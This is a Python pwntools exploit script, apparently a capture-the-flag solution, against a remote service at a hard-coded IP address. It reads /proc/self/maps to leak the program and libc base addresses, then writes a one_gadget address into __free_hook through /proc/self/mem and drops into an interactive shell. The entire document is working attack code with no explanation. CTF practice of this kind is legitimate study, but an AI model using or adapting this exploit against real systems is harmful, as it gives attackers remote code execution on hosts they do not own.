from pwn import*
p = process('./main')
libc = ELF('./libc-2.27.so')
p = remote('119.3.111.133',6666)
context.log_level = 'DEBUG'
context.arch = 'AMD64'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def O(name,sign):
	menu(1)
	p.sendlineafter('Filename:',name)
	p.sendlineafter('Option:',str(sign))
def C():
	menu(2)
def L(off):
	menu(3)
	p.sendlineafter('Offset: ',str(off))
def R(size):
	menu(4)
	p.sendlineafter('Size: ',str(size))
def W(size,content):
	menu(5)
	p.sendlineafter('Size: ',str(size))
	p.sendafter('Content: ',content)
O('/proc/self/maps\x00',0)

R(0x800)
p.recvuntil('Content: ')
proc_base = int(p.recv(12),16)
p.recvuntil('7f')
libc_base = int(('7F' + p.recv(10)),16)
log.info('LIBC:\t'  + hex(libc_base))
log.info('Proc:\t'  + hex(proc_base))
free_hook  =libc_base + libc.sym['__free_hook']
rce = libc_base + 0x4F3C2
C()
O('/proc/self/mem\x00',1)
L(free_hook)
W(0x30,p64(rce))
p.interactive()
